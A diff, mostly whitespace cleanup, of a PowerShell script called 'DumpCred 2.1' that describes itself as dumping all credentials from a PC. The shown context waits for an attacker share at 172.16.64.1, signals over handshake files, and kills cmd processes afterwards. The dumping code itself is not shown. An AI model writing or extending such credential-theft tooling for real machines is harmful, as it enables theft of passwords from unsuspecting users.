@@ -3,7 +3,7 @@
 .SYNOPSIS
    DumpCred 2.1
 .DESCRIPTION
-   Dumps all Creds from a PC 
+   Dumps all Creds from a PC
 .PARAMETER <paramName>
    none
 .EXAMPLE
@@ -24,7 +24,7 @@ $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIde
 $LINE3="`n`n`n"
 
 # Wait for Share
-do { 
+do {
     Start-Sleep -s 1
     Write-Host -NoNewline "-"
 } until (test-path \\172.16.64.1\e)
@@ -34,7 +34,7 @@ do {
 while ( -Not (Test-Path "$SHARE\CON_OK")) {
     Start-Sleep -s 1
     Write-Host -NoNewline "."
-    if ( -Not (( Test-Path "$SHARE\CON_REQ") -or (Test-Path "$SHARE\CON_OK"))) { 
+    if ( -Not (( Test-Path "$SHARE\CON_REQ") -or (Test-Path "$SHARE\CON_OK"))) {
         Write-output " " | out-file "$SHARE\CON_REQ"
         Write-Host -NoNewline "+"
     }
@@ -103,7 +103,7 @@ Write-host "... Rename CON_OK to CON_EOF"
 Rename-Item -Path "$SHARE\CON_OK" -NewName "$SHARE\CON_EOF"
 
 Write-host "... Kill cmds"
-# Kill cmde.exe 
+# Kill cmde.exe
 Stop-Process -name cmd -ErrorAction SilentlyContinue
 
 Write-host "... Remove all Jobs"
